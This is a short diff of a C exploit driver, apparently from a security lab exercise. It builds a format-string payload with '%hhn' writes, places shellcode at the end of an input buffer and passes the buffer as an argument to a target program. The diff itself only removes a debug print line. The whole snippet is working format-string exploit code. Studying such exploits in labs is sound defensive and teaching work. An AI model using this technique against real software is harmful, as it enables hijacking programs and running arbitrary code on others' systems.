@@ -33,8 +33,6 @@ int main(void)
     strcpy(format_string, "%34llx%1llx%1llx%hhn%215llx%hhn%168llx%hhn%156llx%hhn\n");
     memcpy(input + 58, format_string, strlen(format_string) - 1);
     memcpy(input + sizeof(input) - sizeof(shellcode), shellcode, sizeof(shellcode));
-    printf("%d\n", sizeof(input) - sizeof(shellcode));
-
 
     args[0] = TARGET; 
     args[1] = input;
